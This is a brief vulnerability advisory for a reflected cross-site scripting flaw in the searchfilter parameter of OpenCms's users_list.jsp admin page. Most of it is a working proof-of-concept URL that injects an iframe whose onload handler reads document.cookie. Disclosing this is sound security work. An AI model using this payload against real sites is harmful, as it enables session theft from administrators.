Alkacon OpenCms users\_list.jsp searchfilter XSS
Product: Alkacon OpenCms
http://www.opencms.org/
OpenCms contains a cross-site scripting vulnerability in the user management function. Input to parameter searchfilter in page opencms/system/workplace/admin/accounts/users\_list.jsp is not sufficiently validated and/or sanitized before it gets embedded in the resulting web page.
Example:
http://(target)/opencms/system/workplace/admin/accounts/users\_list.jsp?
ispopup=&action=listsearch&framename=&title=
&closelink=%252Fopencms%252Fopencms%252Fsystem%252Fworkplace%252Fviews%2
52Fadmin%252Fadmin-main.jsp%253Faction%253Dinitial%2526path%253D%252Facc
ounts%252Forgunit
&preactiondone=&dialogtype=&message=&resource=&listaction=&base=&selitem
s=
&formname=lsu-form&sortcol=&oufqn=&originalparams=&page=&style=new&root=
&path=%252Faccounts%252Forgunit%252Fusers&redirect=
&searchfilter=%3C%2Fscript%3E%3Ciframe+onload%3Dalert%28document.cookie%
29%3E%3Cscript%3E
&listSearchFilter=%3C%2Fscript%3E%3Ciframe+onload%3Dalert%28document.coo
kie%29%3E%3Cscript%3E
